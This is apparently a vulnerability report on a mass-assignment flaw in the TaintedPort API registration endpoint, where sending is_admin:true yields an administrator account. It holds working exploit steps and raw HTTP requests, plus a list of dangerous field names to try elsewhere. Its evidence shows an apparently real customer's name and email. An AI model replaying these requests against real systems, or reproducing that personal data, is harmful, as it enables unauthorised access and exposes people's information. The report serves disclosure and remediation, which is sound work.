# Mass Assignment on POST /auth/register — `is_admin` field grants full administrator privileges to any unauthenticated attacker

**ID:** vuln-0007
**Severity:** CRITICAL
**Found:** 2026-07-20 11:46:55 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /auth/register
**Method:** POST
**CWE:** CWE-915
**CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

## Description

The registration endpoint `POST /auth/register` on the TaintedPort API binds every field of the client-supplied JSON body into the newly created user record. When an unauthenticated attacker adds `"is_admin": true` alongside the ordinary `name`, `email` and `password` fields, the server accepts it, persists the flag on the new user's row, and immediately issues an auto-login JWT whose signed payload carries `is_admin=true`. That token is trusted by every `/admin/*` endpoint, allowing the attacker to enumerate all customer orders (with PII), read full shipping details for any order, and mutate order state — in a single unauthenticated HTTP request, with no email verification and no rate limit.

The vulnerability is field-name specific: only the exact string `is_admin` triggers self-promotion. Common variants (`isAdmin`, `role`, `admin`, `user_type`) are silently ignored. The behaviour is consistent with a registration handler that forwards every JSON key into the User INSERT and relies on column existence as the only filter — a classic missing allow-list gap. `is_admin` happens to be a real writable column on the `users` table.

## Attack Flow

```
┌────────────────────────────────────────────────────────────────────────────┐
│  Mass Assignment on POST /auth/register → self-promoted administrator      │
└────────────────────────────────────────────────────────────────────────────┘

  Prerequisite: none (registration is open, unauthenticated, no email verify)

   ┌──────────────┐                                    ┌──────────────────────┐
   │  Attacker    │                                    │  TaintedPort API     │
   │ (no account) │                                    │ (PHP 8.2 backend)    │
   └──────┬───────┘                                    └──────────┬───────────┘
          │                                                       │
    ─── PHASE 1: mass-assign is_admin during signup ──────────────
          │  POST /auth/register                                   │
          │  { "name":"MA",                                        │
          │    "email":"attacker@ex.com",                          │
          │    "password":"…",                                     │
          │    "is_admin": true   ◄── extra key, no allow-list     │
          │  }                                                     │
          │──────────────────────────────────────────────────────► │
          │                                                        │
          │                                    ┌───────────────────▼──────────┐
          │                                    │  Registration handler:       │
          │                                    │  binds every JSON key into   │
          │                                    │  INSERT INTO users SET …     │
          │                                    │  `is_admin` is a real column │
          │                                    │  → attacker's value stored   │
          │                                    └───────────────────┬──────────┘
          │                                                        │
          │  HTTP 201  { user.is_admin=true, token: eyJ… }         │
          │◄────────────────────────────────────────────────────── │
          │                                                        │
    ─── PHASE 2: JWT carries signed is_admin=true ────────────────
          │  base64url-decode token payload:                       │
          │  { "user_id":N, "is_admin":true, "iat":…, "exp":… }    │
          │                                                        │
    ─── PHASE 3: use the token against /admin/* ──────────────────
          │  GET /admin/orders                                     │
          │  Authorization: Bearer <admin JWT>                     │
          │──────────────────────────────────────────────────────► │
          │                                    ┌───────────────────▼──────────┐
          │                                    │  Admin middleware checks     │
          │                                    │  jwt.is_admin === true → ✔   │
          │                                    └───────────────────┬──────────┘
          │  HTTP 200  { orders: [139 records] }                   │
          │  ─ user_id, user_name, user_email                      │
          │  ─ shipping_name / city / total per order              │
          │◄────────────────────────────────────────────────────── │
          │                                                        │
          │  GET /admin/orders/{id}                                │
          │──────────────────────────────────────────────────────► │
          │  HTTP 200  { shipping_street, postal_code, phone,      │
          │              delivery_notes, items[…] }                │
          │◄────────────────────────────────────────────────────── │
          │                                                        │
          │  PUT /admin/orders/{id}/status  { status:"…" }         │
          │──────────────────────────────────────────────────────► │
          │  HTTP 200 — order state mutated                        │
          │◄────────────────────────────────────────────────────── │
          ▼

  Root cause:
    • Registration handler forwards every JSON key into the User INSERT.
    • The only implicit "filter" is column existence on the users table.
    • is_admin is a real writable column, so the attacker's value is stored.
    • The admin middleware trusts the is_admin claim in the JWT (which was
      read from the row the attacker controlled).

  Fix in one line:
    Explicitly permit ONLY {name,email,password} from the request body.
```

## Impact

A remote unauthenticated attacker can promote themselves to administrator in one HTTP request. Once admin they can:

- Enumerate every order in the store via `GET /admin/orders`, exposing for each order: `user_id`, `user_name`, `user_email`, `shipping_name`, `shipping_city`, order date and total. During validation this returned 139 orders and included real customer email addresses.
- View any order's full detail via `GET /admin/orders/{id}` — shipping street, postal code, phone number, delivery notes and line items with prices — direct PII for every customer.
- Modify order state via `PUT /admin/orders/{id}/status` — mark orders `processing`, `shipped`, `delivered`, `cancelled`. For a cash-on-delivery wine shop this disrupts real-world fulfilment and can be used to defraud or harass customers.
- Chain with other endpoints reachable only from an administrator role, including endpoints that expose bcrypt password hashes and TOTP secrets, making bulk offline cracking and 2FA hijack trivial.

Business impact: mass PII exposure (regulated under GDPR for the target's EU customer base), order tampering, and a foundation for account takeover of any user in the system. Prerequisite is zero: the attacker needs no account, no token, and no prior knowledge — only the ability to send an HTTPS request.

## Technical Analysis

Root cause: the registration handler does not maintain a field allow-list when mapping the JSON request body into the User INSERT. Observed behaviour is consistent with `INSERT INTO users SET ...$body` (or the framework equivalent) where every posted key is bound if a column with the same name exists on the `users` table. Because `is_admin` is a real column and the handler forwards unknown keys unfiltered, the attacker's flag is persisted verbatim.

Evidence pipeline (each step verified independently during validation):

1. `POST /auth/register` with `is_admin:true` returns 201 with `user.is_admin=true` in the response body.
2. The JWT issued immediately by the server contains `"is_admin":true` in its signed payload — meaning the token-signing routine read the value from the row that was just inserted, so the flag is truly persisted in the database, not merely echoed.
3. A subsequent `GET /auth/me` (which re-reads the row from the DB) still shows `is_admin=true`, ruling out any response-only echo of the client input.
4. `GET /admin/orders` returns HTTP 200 with the full admin payload for this token, whereas the same call with a normal-user JWT (verified as a control in the same run) returns HTTP 403 `Admin access required.`. This proves the backend BFLA check is driven off `is_admin`, and that the mass-assigned flag flows all the way through to it.
5. `PUT /admin/orders/{id}/status` was probed with a non-existent order id (999999) to avoid tampering with real data. The normal-user token returned 403 `Admin access required.`; the mass-assigned admin token returned 404 `Order not found.` — the admin-check is bypassed for writes as well as reads.

Field-name specificity: only the exact key `is_admin` triggers the vulnerability. Variants `isAdmin`, `role`, `admin`, `user_type`, `is_admin_user` are silently discarded, suggesting the handler is a loose bind-all whose only filter is column existence on the target table. This gives an attacker a compact list of dangerous keys to try against every other write endpoint (`id`, `user_id`, `password_hash`, `totp_secret`, `totp_enabled`, `is_admin`).

CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) is the direct match. Effect also implicates CWE-269 (Improper Privilege Management).

## Proof of Concept

Reproduction requires no credentials.

1. Send `POST /auth/register` with `Content-Type: application/json` and body:
   `{"name":"MA","email":"attacker+<ts>@example.com","password":"Attacker!Pass123","is_admin":true}`
   Server responds `201 Created` with `{"success":true,"token":"eyJ...","user":{"id":N,"is_admin":true}}`.

2. Base64url-decode the middle segment of the JWT. Confirm the payload contains `"is_admin":true`.

3. Optional sanity check — `GET /auth/me` with `Authorization: Bearer <token>` returns `user.is_admin=true` (server re-read from DB confirms persistence).

4. `GET /admin/orders` with the same `Authorization` header returns HTTP 200 and the full list of orders (customer emails, names, cities, totals). Baseline control: repeat the same call with a JWT from a normal registration and observe HTTP 403 "Admin access required."

5. Write-access proof without tampering: `PUT /admin/orders/999999/status {"status":"processing"}` with the mass-assigned admin token returns HTTP 404 "Order not found." while the same request with a normal token returns HTTP 403 "Admin access required." — the admin check is bypassed for writes.

Full reproduction and evidence are in `poc.py`; automated pass/fail check is in `verify.py`.

```
See poc_script_path (poc.py in the validation artifacts).
```

## Evidence

### 1. Baseline — normal registration produces a non-admin user

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"Normal User","email":"val-normal-1784547808520@example.com","password":"NormalP@ss123"}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"token":"eyJ...(non-admin)","user":{"id":441,"name":"Normal User","email":"val-normal-1784547808520@example.com","is_admin":false}}
```

> Registering without is_admin correctly creates a non-admin user.

### 2. Baseline — the non-admin token is denied by /admin/orders

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <normal-user JWT>
```

**Response:**
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"success":false,"message":"Admin access required."}
```

> Confirms the server enforces an is_admin-based BFLA check on /admin/*.

### 3. Exploit — inject is_admin:true into the registration body

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"MA Admin PoC","email":"val-admin-1784547808520@example.com","password":"AdminP@ss123","is_admin":true}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"token":"eyJhbGciOiJIUzI1NiJ9...","user":{"id":442,"name":"MA Admin PoC","email":"val-admin-1784547808520@example.com","is_admin":true}}
```

> Server accepts the extra is_admin field and persists it. The response object confirms the user was stored with is_admin=true.

### 4. Decoded JWT payload — signed admin claim

**Request:**
```http
(no request — client-side base64url decode of the JWT payload segment)
```

**Response:**
```http
{"user_id":442,"email":"val-admin-1784547808520@example.com","is_admin":true,"iat":1784547808,"exp":1785152608}
```

> The JWT signed by the backend carries is_admin=true, meaning the token-issuing routine read the value from the freshly persisted DB row.

### 5. /auth/me re-reads the row and confirms persistence

**Request:**
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"user":{"id":442,"name":"MA Admin PoC","email":"val-admin-1784547808520@example.com","is_admin":true,"totp_enabled":false,"created_at":"2026-07-20 11:43:28"}}
```

> Server-side re-read still shows is_admin=true — the flag is persisted, not merely echoed.

### 6. Confidentiality — /admin/orders is now accessible (customer PII leak)

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":139,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":...,"status":"pending","shipping_name":"...","shipping_city":"...","order_date":"2026-07-20 11:43:13","items_count":1}, ... 139 total records ...]}
```

> All orders in the system are enumerated, exposing user_id, name, email, shipping name/city and totals for every customer.

### 7. Confidentiality — /admin/orders/{id} exposes full shipping details

**Request:**
```http
GET /admin/orders/137 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":137,"user_id":...,"total":...,"status":"pending","shipping_name":...,"shipping_street":...,"shipping_city":...,"shipping_postal_code":...,"shipping_phone":...,"delivery_notes":...,"user_name":...,"user_email":...,"items":[...]}}
```

> Order detail exposes full street address, postal code and phone number of the customer — direct PII.

### 8. Integrity — write access to /admin/orders/{id}/status (safe probe: non-existent order id)

**Request:**
```http
PUT /admin/orders/999999/status HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <mass-assigned admin JWT>
Content-Type: application/json

{"status":"processing"}
```

**Response:**
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"success":false,"message":"Order not found."}
```

> With the mass-assigned admin token the request passes authorisation and reaches business validation (404). The same request with a normal-user token returns 403 'Admin access required.' — proving admin-check is bypassed for writes as well, without tampering with any real order.


## Remediation

1. Bind explicit fields only in the registration handler. Extract `name`, `email` and `password` from the request body by name and ignore everything else. In PHP:
```php
$body = json_decode(file_get_contents('php://input'), true) ?? [];
$allowed = ['name','email','password'];
$body = array_intersect_key($body, array_flip($allowed));
$stmt = $pdo->prepare("INSERT INTO users (name, email, password_hash) VALUES (:n,:e,:h)");
$stmt->execute([':n'=>$body['name'], ':e'=>$body['email'], ':h'=>password_hash($body['password'], PASSWORD_BCRYPT)]);
```

2. Maintain a server-side deny-list constant for every write endpoint, covering at minimum: `id`, `user_id`, `is_admin`, `password_hash`, `totp_secret`, `totp_enabled`, `created_at`, `email_verified`. Reject or strip these before any INSERT/UPDATE regardless of the endpoint.

3. Add a regression test that posts `{name,email,password,is_admin:true,isAdmin:true,role:"admin"}` to `/auth/register` and asserts the resulting `users` row has `is_admin=false` and the issued JWT contains `is_admin=false`.

4. Audit every other write endpoint (`PUT /auth/profile`, order creation, address updates, etc.) for the same pattern. Grep for direct assignment of `$_POST`, `$body`, `req.body`, `params.permit!` or ORM `update(**body)` to surface further offenders.

5. Defence in depth on admin checks. Even if a JWT arrives with `is_admin=true`, the `/admin/*` middleware should re-read the row from the database and re-verify `is_admin` there before granting access. This raises the bar from "one HTTP request" to "one HTTP request plus persistent DB tampering".

6. Invalidate the already-issued admin tokens and admin rows created by exploitation. Query the `users` table for `is_admin=true` rows and reconcile them against the intended admin allow-list; revoke sessions/JWTs for any unexpected admins.

## Conditions for Severity Increase

If the admin surface exposes destructive actions (bulk delete, user-account deletion, refund/payment endpoints) or leaks credentials such as bcrypt password hashes and TOTP secrets, `availability` rises to H and this becomes a compound compromise: full account takeover of every user via offline hash cracking and 2FA hijack. Similarly, if the `users` table contains additional writable-from-registration columns beyond `is_admin` (e.g. `email_verified`, `credit_balance`), impact expands accordingly. Scope also becomes C if administrator capabilities cross into a separate security authority (e.g. a linked payment processor account or shared identity provider).
